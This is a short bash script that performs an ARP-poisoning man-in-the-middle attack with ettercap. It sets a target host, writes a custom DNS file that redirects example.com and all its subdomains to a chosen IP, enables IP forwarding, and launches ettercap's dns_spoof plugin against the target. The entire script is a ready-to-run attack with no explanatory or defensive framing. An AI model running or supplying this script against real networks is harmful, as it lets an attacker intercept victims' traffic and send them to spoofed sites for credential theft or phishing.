#!/usr/bin/bash

iface="eth0"
target_ip="192.168.1.100"
spoof_domain="example.com"
spoof_ip="192.168.1.50"

if [ -z "$target_ip" ]; then
  echo "[-] Target IP is empty. Set the variable in the script."
  exit 1
fi

dnsfile="/tmp/custom_etter.dns"

echo "$spoof_domain A $spoof_ip" > "$dnsfile"
echo "*.$spoof_domain A $spoof_ip" >> "$dnsfile"

export ETTER_DNS_FILE="$dnsfile"

echo 1 > /proc/sys/net/ipv4/ip_forward

ettercap -T -q -i "$iface" -M arp:remote /"$target_ip"/ // -P dns_spoof
